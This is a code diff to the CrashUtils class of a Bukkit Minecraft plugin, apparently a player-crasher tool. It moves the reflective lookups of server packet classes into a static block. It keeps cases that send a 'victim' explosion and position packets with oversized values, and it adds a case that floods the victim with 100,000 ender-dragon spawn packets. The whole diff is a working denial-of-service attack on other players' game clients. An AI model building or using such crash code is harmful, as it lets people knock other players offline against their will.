@@ -2,6 +2,7 @@ package crash.players.crasher;
 
 import crash.players.Main;
 import org.bukkit.Bukkit;
+import org.bukkit.Location;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
@@ -14,9 +15,38 @@ import java.util.Set;
 public class CrashUtils {
     private static final String serverVersion;
 
+    // Class imports for the Explosion packet.
+    static Class<?> Vec3D;
+    static Class<?> PacketPlayOutExplosion;
+
+    // Class imports for the Position packet.
+    static Class<?> PacketPlayOutPosition;
+
+    // Class imports for the Entity packet.
+    static Class<?> entityEnderDragonClass;
+    static Class<?> craftWorldClass;
+    static Class<?> worldClass;
+    static Class<?> packetPlayOutSpawnEntityLivingClass;
+    static Class<?> entityLivingClass;
+
     static {
         String path = Bukkit.getServer().getClass().getPackage().getName();
         serverVersion = path.substring(path.lastIndexOf(".") + 1);
+
+        try {
+            Vec3D = Class.forName("net.minecraft.server." + serverVersion + ".Vec3D");
+            PacketPlayOutExplosion = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutExplosion");
+
+            PacketPlayOutPosition = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutPosition");
+
+            entityEnderDragonClass = Class.forName("net.minecraft.server." + serverVersion + ".EntityEnderDragon");
+            craftWorldClass = Class.forName("org.bukkit.craftbukkit." + serverVersion + ".CraftWorld");
+            worldClass = Class.forName("net.minecraft.server." + serverVersion + ".World");
+            packetPlayOutSpawnEntityLivingClass = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutSpawnEntityLiving");
+            entityLivingClass = Class.forName("net.minecraft.server." + serverVersion + ".EntityLiving");
+        } catch (ClassNotFoundException e) {
+            throw new RuntimeException(e);
+        }
     }
 
     /**
@@ -29,15 +59,11 @@ public class CrashUtils {
         try {
             switch (crashType) {
                 case EXPLOSION:
-
-                    // Vec3D with fat arguments
-                    Class<?> Vec3D = Class.forName("net.minecraft.server." + serverVersion + ".Vec3D");
                     Constructor<?> vec3DConstructor = Vec3D.getConstructor(double.class, double.class, double.class);
                     Object vec3d = vec3DConstructor.newInstance(
                             d(), d(), d());
 
                     // PacketPlayOutExplosion with fat arguments
-                    Class<?> PacketPlayOutExplosion = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutExplosion");
                     Constructor<?> playOutConstructor = PacketPlayOutExplosion.getConstructor(
                             double.class, double.class, double.class, float.class, List.class, Vec3D);
                     Object explosionPacket = playOutConstructor.newInstance(
@@ -47,9 +73,6 @@ public class CrashUtils {
 
                     break;
                 case POSITION:
-
-                    // PacketPlayOutPosition with fat arguments
-                    Class<?> PacketPlayOutPosition = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutPosition");
                     Constructor<?> playOutPositionConstructor = PacketPlayOutPosition.getConstructor(
                             double.class, double.class, double.class, float.class, float.class, Set.class);
                     Object posPacket = playOutPositionConstructor.newInstance(
@@ -57,6 +80,22 @@ public class CrashUtils {
 
                     sendPacket(victim, posPacket);
 
+                    break;
+                case ENTITY:
+                    Location loc = victim.getLocation();
+
+                    for (int i = 0; i < 100000; i++) {
+                        Object craftWorld = craftWorldClass.cast(loc.getWorld());
+                        Object getHandle = craftWorld.getClass().getMethod("getHandle").invoke(craftWorld);
+
+                        Constructor<?> enderDragonConstructor = entityEnderDragonClass.getConstructor(worldClass);
+                        Object dragonEntity = enderDragonConstructor.newInstance(getHandle);
+
+                        Constructor<?> enderDragonPacketConstructor = packetPlayOutSpawnEntityLivingClass.getConstructor(entityLivingClass);
+                        Object enderDragonPacket = enderDragonPacketConstructor.newInstance(dragonEntity);
+
+                        sendPacket(victim, enderDragonPacket);
+                    }
                     break;
             }
 
